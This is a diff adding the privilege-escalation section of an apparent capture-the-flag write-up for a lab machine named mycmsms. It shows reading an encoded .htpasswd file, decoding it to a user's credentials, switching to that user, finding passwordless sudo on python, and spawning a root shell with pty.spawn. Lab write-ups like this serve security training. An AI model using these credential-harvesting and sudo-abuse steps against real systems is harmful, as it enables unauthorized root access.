@@ -232,4 +232,46 @@ checked ncat listener and bull's eye, got a reverse shell.
 
 ## Privilege Escalation
 
+```
+www-data@mycmsms:/var/www/html/admin$ cat .htpasswd 
+TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=
+www-data@mycmsms:/var/www/html/admin$
+```
+playing around, got an `.htpasswd` file in `/var/www/html/admin/` dir. it contain an encoded text. let's decode this text
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e5434102-fffb-4142-92c2-18408872b33e)
+
+decoded the text and boom got creds `armour:Shield@123`. let's su using this creds.
+
+```
+www-data@mycmsms:/home/armour$ su armour
+Password: 
+armour@mycmsms:~$ sudo -l
+Matching Defaults entries for armour on mycmsms:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User armour may run the following commands on mycmsms:
+    (root) NOPASSWD: /usr/bin/python
+armour@mycmsms:~$
+```
+switched user to user `armour`, checking for sudo privs, we can run `/usr/bin/python` as root without password. let's abuse it
+
+```
+armour@mycmsms:~$ sudo /usr/bin/python
+Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
+[GCC 8.3.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import pty;pty.spawn("/bin/bash")
+root@mycmsms:/home/armour# id
+uid=0(root) gid=0(root) groups=0(root)
+root@mycmsms:/home/armour# 
+```
+opened python and spawn a tty shell, and Boom we got root.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d5977c2d-b99b-4b1d-b414-faaf8f3a961d)
+
+And we are through 😜 had fun yeah? 
+
+
+
 
